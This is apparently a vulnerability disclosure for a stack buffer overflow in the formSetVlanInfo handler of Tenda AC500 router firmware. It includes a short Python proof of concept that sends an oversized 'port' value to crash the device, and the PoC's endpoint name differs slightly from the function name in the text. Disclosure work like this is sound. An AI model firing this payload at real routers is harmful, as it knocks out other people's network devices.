## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2470.html

## Affected version

AC500 V2.0.1.9(1307)

## Vulnerability details

The Tenda AC500 V2.0.1.9(1307) firmware has a stack overflow vulnerability in the `formSetVlanInfo` function. The `src` variable receives the `port` parameter from a POST request and is later assigned to the `dest` variable, which is fixed at 256 bytes. However, since the user can control the input of `port`, the statement `strcpy(dest, src);` can cause a buffer overflow. The user-provided `port` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410155355406.png)

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410155334117.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/forSetVlanInfo"
payload = b"a"*1000

data = {"action":"add","port": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410095430899.png)

